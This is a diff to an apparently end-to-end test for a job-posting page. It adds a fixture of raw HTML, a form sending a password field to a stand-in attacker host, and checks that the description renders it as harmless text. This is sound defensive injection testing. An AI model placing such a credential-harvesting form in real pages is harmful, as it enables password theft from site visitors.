@@ -31,6 +31,9 @@ const tag = `view-${Date.now().toString(36)}`;
 const TITLE = `Staff Engineer ${tag}`;
 // A posting id nobody has
 const UNKNOWN_ID = '65e2e00000000000000000aa';
+// Raw HTML a recruiter wrote in the description: shown as text (JobDetails, html={false})
+const RAW_FORM =
+	'<form action="https://attacker.example/collect"><input name="password" type="password"></form>';
 
 let owner: OwnerSession;
 let recruiterApi: APIRequestContext;
@@ -39,7 +42,11 @@ let job: RecruiterJob;
 test.beforeAll(async () => {
 	owner = await ownerSession(DOMAIN);
 	recruiterApi = await apiAs(await recruiterSession());
-	job = await createJob(recruiterApi, { title: TITLE, status: 'open' });
+	job = await createJob(recruiterApi, {
+		title: TITLE,
+		status: 'open',
+		description: `## The job\n\nCreated by an end-to-end test.\n\n${RAW_FORM}`
+	});
 	// Picked on the job step, as the Hire page sends it
 	const picked = await recruiterApi.post(`${API_URL}/workflow/domains/${DOMAIN}/steps/job`, {
 		data: { input: { jobId: job._id } }
@@ -69,8 +76,12 @@ test('the owner reads the job the recruiter picked on their journey, on a page n
 	await expect(page.getByText('E2E Corp')).toBeVisible();
 	await expect(page.getByText(/45,000/)).toBeVisible();
 	await expect(page.getByRole('heading', { name: 'About the job' })).toBeVisible();
+	// The description's raw HTML stays text: it cannot add a form to the page
+	await expect(page.locator('form[action^="https://attacker.example"]')).toHaveCount(0);
+	await expect(page.locator('input[type="password"]')).toHaveCount(0);
+	await expect(page.getByText(RAW_FORM, { exact: false })).toBeVisible();
 	// Dated, and says who else can open it
-	await expect(page.getByText(/^Published \d+ \w+ \d{4}$/)).toBeVisible();
+	await expect(page.getByText(/^Opened \d+ \w+ \d{4}$/)).toBeVisible();
 	await expect(page.getByText(/only you and the recruiter who shared/)).toBeVisible();
 	await expect(page).toHaveTitle(`${TITLE} | Portfolio`);
 	await expect(page.locator('meta[name="robots"]')).toHaveAttribute('content', /\bnoindex\b/);
